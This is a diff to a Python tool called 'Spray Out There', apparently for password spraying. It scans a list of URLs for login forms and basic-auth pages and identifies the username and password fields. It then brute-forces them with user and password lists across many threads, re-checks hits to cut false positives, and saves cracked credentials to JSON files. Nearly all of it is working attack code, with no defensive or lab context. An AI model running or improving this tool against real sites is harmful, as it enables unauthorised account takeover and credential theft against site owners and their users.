@@ -53,7 +53,7 @@ class Login(object):
             return login if login.login_found else False
 
         return False
-    
+
     @staticmethod
     def LoadUrlsFile(file: str, filter=True) -> list:
         with open(file, 'r') as f:
@@ -95,7 +95,7 @@ class LoginBA(Login):
 
 class LoginForm(Login):
 
-    USER_FIELDS = ['user','email','usuario']
+    USER_FIELDS = ['user','mail','login','usuario']
     LOGIN_FAIL = ['invalid login','authentication failed','password incorrect','error!','incorrect','invalid','failed']
 
     def __init__(self, url: str, auto=True):
@@ -127,11 +127,28 @@ class LoginForm(Login):
             inputs = form.find_all('input')
             buttons = form.find_all('button')
             self.login_url = urljoin(self.url, form.get('action'))
-            if form.get('method').lower() == 'get':
-                self.login_type = Login.AuthType.FORM_GET
 
-            user_field = [x.get('name') for x in inputs if x.get('name') and any(u in x.get('name').lower() for u in LoginForm.USER_FIELDS)]
-            pass_field = [x.get('name') for x in inputs if x.get('type') == 'password']
+            method = form.get('method')
+            if method and method.lower() == 'get':
+                self.login_type = Login.AuthType.FORM_GET
+            else:
+                self.login_type = Login.AuthType.FORM_POST
+
+            user_fields = [x.get('name') for x in inputs if x.get('name') and (not x.get('type') or (x.get('type') == 'email' or x.get('type') == 'text'))]
+            if len(user_fields) == 1:
+                user_field = user_fields[0]
+            elif len(user_fields) > 1:
+                possibles = [x for x in user_fields if any(u in x.lower() for u in LoginForm.USER_FIELDS)]
+                if possibles:
+                    user_field = possibles[0]
+                else:
+                    user_field = user_fields[0]
+            else:
+                # TODO Logins with only password
+                return
+
+            pass_fields = [x.get('name') for x in inputs if x.get('type') == 'password']
+
             other_fields =  {
                 **dict((x.get('name'), x.get('value')) for x in inputs if x.get('name')),
                 **dict((x.get('name'), x.get('value')) for x in buttons if x.get('name'))
@@ -140,12 +157,12 @@ class LoginForm(Login):
                 if not v:
                     other_fields[k] = ''
 
-            if len(pass_field) == 1:
-                self.ipass = pass_field[0]
-                del other_fields[pass_field[0]]
+            if len(pass_fields) == 1:
+                self.ipass = pass_fields[0]
+                del other_fields[pass_fields[0]]
                 if user_field:
-                    self.iuser = user_field[0]
-                    del other_fields[user_field[0]]
+                    self.iuser = user_field
+                    del other_fields[user_field]
 
                 self.login_found = True
                 self.others = other_fields
@@ -211,16 +228,19 @@ class Brute(object):
         self.user_list = users
         self.pass_list = passwords
         self.creds = None
+        self.errors = 0
         self.ref_url = login.url
         self.login_url = login.login_url
         self.headers = {
             'Referer': self.ref_url,
             **Brute.HTTP_UA
         }
+
         self.login_type = login.login_type
-        if self.login_type == Login.AuthType.FORM_POST:
+        if self.login_type != Login.AuthType.BASIC_AUTH:
             self.iuser = login.iuser
             self.ipass = login.ipass
+        if self.login_type == Login.AuthType.FORM_POST:
             self.others = login.others
 
         self.__select_best_bad(login.bad_logins)
@@ -246,6 +266,7 @@ class Brute(object):
                     self.bad_value = option['value']
 
     def Start(self, threads=10):
+        print(self.login_url)
         workers = []
         with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
             for password in self.pass_list:
@@ -254,13 +275,22 @@ class Brute(object):
                     workers.append(w)
             for worker in concurrent.futures.as_completed(workers):
                 if worker.result():
-                    pool.shutdown(wait=False)
-                    return (self.login_url, self.creds)
+                    if self.__reverify():
+                        pool.shutdown(wait=False)
+                        return (self.login_url, self.creds)
+                    else:
+                        self.creds = None
         return False
 
     def CheckCreds(self, username: str, password: str) -> bool:
-        if self.creds:
+        if self.creds or self.errors > 8:
             return False
+        return self.__check_creds(username, password)
+
+    def __reverify(self) -> bool:
+        return not self.__check_creds('foobar', 'notavalidpass')
+
+    def __check_creds(self, username: str, password: str) -> bool:
         response = self.__do_attempt(username, password)
         if not response:
             return False
@@ -292,11 +322,13 @@ class Brute(object):
                     return False
             except requests.exceptions.ConnectionError:
                 attempt += 2
+                self.errors += 1
             except requests.exceptions.HTTPError:
                 attempt += 1
                 sleep(attempt)
             except requests.exceptions.Timeout:
                 attempt += 1
+                self.errors += 1
                 sleep(attempt * 2)
             except requests.exceptions.TooManyRedirects:
                 return False
@@ -333,16 +365,15 @@ class Brute(object):
         return self.bad_value not in response.text.lower()
 
 
-
 if __name__ == "__main__":
     print('\n  --  Spray Out There  --  \n')
     parser = argparse.ArgumentParser(description='Spray Out There')
     parser.add_argument('input', type=str, nargs='+', help='file or url')
-    parser.add_argument('-u', type=str, help='user')
-    parser.add_argument('-p', type=str, help='password')
-    parser.add_argument('-U', type=str, help='user file')
-    parser.add_argument('-P', type=str, help='password file')
-    parser.add_argument('-o', type=str, help='output file prefix')
+    parser.add_argument('-u', metavar='user', type=str, help='user')
+    parser.add_argument('-p', metavar='pass', type=str, help='password')
+    parser.add_argument('-U', metavar='file', type=str, help='user file')
+    parser.add_argument('-P', metavar='file', type=str, help='password file')
+    parser.add_argument('-o', metavar='file', type=str, help='output file prefix')
     parser.add_argument('--filter-urls', action='store_true', help='Filter urls for certain keywords before search for logins')
     args = parser.parse_args()
 
@@ -385,13 +416,17 @@ if __name__ == "__main__":
             logins.append(r)
 
     print('> %s Logins found' % len(logins))
+    print(*[l.url for l in logins], sep='\n')
 
+    print('> Analyzing login responses ...')
     with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
         workers = [pool.submit(login.FindBadLogin) for login in logins]
     concurrent.futures.wait(workers)
 
-    with open('logins.json', '+w') as file:
-        json.dump([vars(l) for l in logins], file, sort_keys=True, indent=4)
+    if args.o:
+        file_logins = '{}_logins.json'.format(args.o)
+        with open(file_logins, '+w') as file:
+            json.dump([vars(l) for l in logins], file, sort_keys=True, indent=4)
 
     brutes = [Brute(users, passwords, login) for login in logins if login.bad_logins]
     print('> Bruteforcing %s logins ...' % len(brutes))
@@ -402,7 +437,9 @@ if __name__ == "__main__":
             result = worker.result()
             if result:
                 creds.append(result)
-                print('[!] CREDS FOUND ', result)
+                print(' [!] CREDS FOUND ', result)
 
-    with open('credentials.json', '+w') as file:
-        json.dump(creds, file, sort_keys=True, indent=4)
+    if args.o:
+        file_credetials = '{}_credentials.json'.format(args.o)
+        with open(file_credetials, '+w') as file:
+            json.dump(creds, file, sort_keys=True, indent=4)
